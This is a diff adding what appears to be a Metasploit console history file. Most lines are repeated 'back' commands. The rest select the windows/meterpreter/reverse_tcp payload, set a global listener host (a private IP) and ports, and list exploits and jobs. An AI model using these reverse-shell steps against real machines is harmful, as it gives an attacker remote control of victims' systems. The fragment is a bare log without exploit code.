@@ -1,0 +1,30 @@
+back
+db_status
+back
+setg
+back
+db_status
+back
+use windows/meterpreter/reverse_tcp
+back
+setg
+use windows/meterpreter/reverse_tcp
+back
+show exploits
+show exploits
+back
+setg LHOST 192.168.0.105
+setg LHOST 192.168.0.105
+back
+back
+jobs
+jobs
+back
+back
+back
+back
+setg LPORT 9878
+back
+back
+setg LPORT 2208
+back
